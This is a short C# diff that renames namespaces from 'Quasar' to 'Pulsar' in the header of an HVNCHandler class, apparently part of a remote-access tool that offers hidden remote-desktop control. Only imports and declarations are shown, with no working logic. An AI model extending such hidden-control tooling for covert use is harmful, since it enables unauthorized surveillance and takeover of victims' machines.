@@ -5,17 +5,17 @@ using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
 using System.Threading;
-using Quasar.Client.Helper;
-using Quasar.Client.Helper.HVNC;
-using Quasar.Common.Enums;
-using Quasar.Common.Messages;
-using Quasar.Common.Messages.Monitoring.HVNC;
-using Quasar.Common.Messages.other;
-using Quasar.Common.Networking;
-using Quasar.Common.Video;
-using Quasar.Common.Video.Codecs;
+using Pulsar.Client.Helper;
+using Pulsar.Client.Helper.HVNC;
+using Pulsar.Common.Enums;
+using Pulsar.Common.Messages;
+using Pulsar.Common.Messages.Monitoring.HVNC;
+using Pulsar.Common.Messages.other;
+using Pulsar.Common.Networking;
+using Pulsar.Common.Video;
+using Pulsar.Common.Video.Codecs;
 
-namespace Quasar.Client.Messages
+namespace Pulsar.Client.Messages
 {
     public class HVNCHandler : IMessageProcessor, IDisposable
     {
